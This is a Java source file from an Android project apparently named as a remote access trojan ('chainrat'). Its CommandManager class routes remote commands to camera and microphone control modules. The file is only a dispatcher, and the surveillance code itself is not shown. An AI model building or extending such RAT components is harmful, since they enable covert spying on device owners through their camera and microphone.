package com.nefi.chainrat;

import android.content.Context;
import android.util.Log;
import com.nefi.chainrat.modules.CameraCommand;
import com.nefi.chainrat.modules.MicrophoneControl;
import com.nefi.chainrat.networking.Command;
import dalvik.system.DexFile;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

public class CommandManager {

    private final static String TAG = "CM";
    private final static String PACKAGE = "com";
    //private List<Class> myModuleClasses;
    private List <IModule> myModules = new ArrayList<>();

    public CommandManager(){
        Log.d(TAG, "Starting CommandManager for loop...");


        //My modules
        Log.d(TAG, "Adding modules...");
        CameraCommand cameraCommand = new CameraCommand();
        MicrophoneControl microphoneControl = new MicrophoneControl();

        //Add to list
        myModules.add(cameraCommand);
        myModules.add(microphoneControl);

        Log.d(TAG, "done! Size: " + myModules.size());
    }

    public boolean executeCommand(Command command){
        for(IModule m : myModules){
            if(m.handlerType() == command.getType()){
                m.execute(command);
            }
        }
        return false;
    }
}

